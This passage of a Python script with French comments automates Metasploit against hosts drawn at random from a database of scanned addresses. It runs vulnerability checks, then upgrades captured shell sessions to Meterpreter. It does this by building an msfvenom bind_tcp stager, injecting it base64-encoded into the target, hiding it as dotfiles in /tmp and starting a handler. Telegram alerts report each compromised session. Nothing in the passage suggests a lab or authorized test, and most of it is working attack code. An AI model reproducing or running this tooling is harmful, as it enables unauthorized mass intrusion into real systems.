        print(f"[ERREUR] Problème lors de la récupération des hôtes debug : {e}")
        return []


# Récupérer un hôte aléatoire depuis la base de données
def get_random_host(type):
    try:
        with psycopg2.connect(dbname=PG_DBNAME, user=PG_USER, password=PG_PASSWORD, host=PG_HOST) as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "SELECT id, address FROM hosts TABLESAMPLE SYSTEM(0.1) "
                    "WHERE os_name = %s AND host(address::inet) NOT LIKE 'fe80:%%' LIMIT 1;",
                    (type,)
                )
                return cur.fetchone() or (None, None)
    except psycopg2.Error as e:
        print(f"[ERREUR] Problème lors de la récupération d'un hôte : {e}")
        return None, None

def kill_process_by_name(process_name):
    for proc in psutil.process_iter(['pid', 'name']):
#        print(f"[INFO] Processus {proc.info['name']} (PID: {proc.info['pid']}) ...")
        if process_name in proc.info['name']:
            try:
                proc2kill = psutil.Process(proc.info['pid'])
                proc2kill.terminate()
                proc2kill.wait(timeout=3)
                print(f"[INFO] Processus {process_name} (PID: {proc.info['pid']}) terminé.")
            except psutil.NoSuchProcess:
                print(f"[ERREUR] Processus {process_name} n'existe plus.")
            except psutil.AccessDenied:
                print(f"[ERREUR] Accès refusé pour terminer le processus {process_name} (PID: {proc.info['pid']}).")
            except psutil.TimeoutExpired:
                print(f"[ERREUR] Temps d'attente expiré pour terminer le processus {process_name} (PID: {proc.info['pid']}).")
            return



def check_target(console, fullname, rhosts, rport):
    """Lance MSF check sur la cible. Retourne False si explicitement non vulnérable."""
    try:
        console.read()  # vider buffer
        cmds = f"use {fullname}\nset RHOSTS {rhosts}\n"
        if rport:
            cmds += f"set RPORT {rport}\n"
        cmds += "check\n"
        console.write(cmds)
        for _ in range(15):
            time.sleep(1)
            if not console.is_busy():
                break
        data = console.read()['data'].lower()
        if any(s in data for s in ['not exploitable', 'not vulnerable', 'safe', 'does not appear', 'cannot exploit']):
            return False
        return True
    except Exception:
        return True  # en cas d'erreur, procéder quand même


def upgrade_to_meterpreter(client, sid, host, bind_port=None):
    """
    Upgrade une shell session en meterpreter via bind_tcp.
    Pas de LHOST requis — le container se connecte AU target (bind, pas reverse).
    """
    if bind_port is None:
        bind_port = BIND_PORT

    print(f"\n[UPGRADE] Session {sid} ({host}) → meterpreter (bind_tcp:{bind_port})...")

    c = client.consoles.console()
    c.read()

    def shell_cmd(cmd):
        c.write(f'sessions -c "{cmd}" -i {sid}\n')
        for _ in range(6):
            time.sleep(1.5)
            out = c.read()['data']
            if not c.is_busy():
                return out
        return c.read()['data']

    # 1. Détecter l'architecture
    arch = 'x86'
    out = shell_cmd('uname -m')
    if 'x86_64' in out:
        arch = 'x64'
    print(f"[UPGRADE] Arch détectée: {arch}")

    payload = f'linux/{arch}/meterpreter/bind_tcp'
    elf_path = f'/tmp/.uzi_{sid}'

    # 2. Générer le stager avec msfvenom
    result = subprocess.run(
        ['/opt/metasploit/msfvenom', '-p', payload,
         f'LPORT={bind_port}', '-f', 'elf', '-o', elf_path],
        capture_output=True
    )
    if not os.path.exists(elf_path):
        print(f"[UPGRADE] msfvenom échoué: {result.stderr.decode()[:200]}")
        return None

    # 3. Injecter via la session shell (base64 → décode → exécute)
    with open(elf_path, 'rb') as f:
        b64 = base64.b64encode(f.read()).decode()
    os.unlink(elf_path)

    remote_b64 = f'/tmp/.p{sid}'
    remote_elf = f'/tmp/.m{sid}'

    # Nettoyer tout stager précédent sur ce port (évite "address already in use")
    shell_cmd(f'fuser -k {bind_port}/tcp 2>/dev/null; pkill -9 -f {remote_elf} 2>/dev/null; rm -f {remote_b64} {remote_elf}; true')
    time.sleep(1)

    shell_cmd(f'printf "{b64}" > {remote_b64}')
    shell_cmd(f'base64 -d {remote_b64} > {remote_elf} && chmod +x {remote_elf} && {remote_elf} &')
    time.sleep(3)

    # 4. Démarrer le handler bind_tcp (se connecte AU target)
    known = set(client.sessions.list.keys())
    h = client.consoles.console()
    h.read()
    for cmd in [
        'use exploit/multi/handler',
        f'set PAYLOAD {payload}',
        f'set LPORT {bind_port}',
        f'set RHOST {host}',
        'set ExitOnSession false',
        'run -j',
    ]:
        h.write(cmd + '\n')
        time.sleep(0.5)

    # 5. Attendre la session meterpreter
    for _ in range(20):
        time.sleep(2)
        h.read()
        new = {k: v for k, v in client.sessions.list.items()
               if k not in known and v.get('type') == 'meterpreter'}
        if new:
            msid = list(new.keys())[0]
            info = new[msid]
            print(f"[UPGRADE] Meterpreter session {msid} — "
                  f"{info.get('platform')}/{info.get('arch')} as {info.get('username')}")
            return msid

    print("[UPGRADE] Timeout — upgrade échoué")
    return None


def handle_new_sessions(client, sessions, upgraded_sessions, host):
    """Upgrade les nouvelles shell sessions, alerte Telegram avec le résultat final."""
    new_shells = {k: v for k, v in sessions.items()
                  if k not in upgraded_sessions and v.get('type') == 'shell'}
    for sid, info in new_shells.items():
        upgraded_sessions.add(sid)
        msid = upgrade_to_meterpreter(client, sid, info.get('session_host', str(host)))
        if msid:
            upgraded_sessions.add(msid)

    current = client.sessions.list
    if current:
        print(f"[SESSION] {len(current)} session(s) actives: {list(current.keys())}")
        send_telegram_alert(current, str(host))


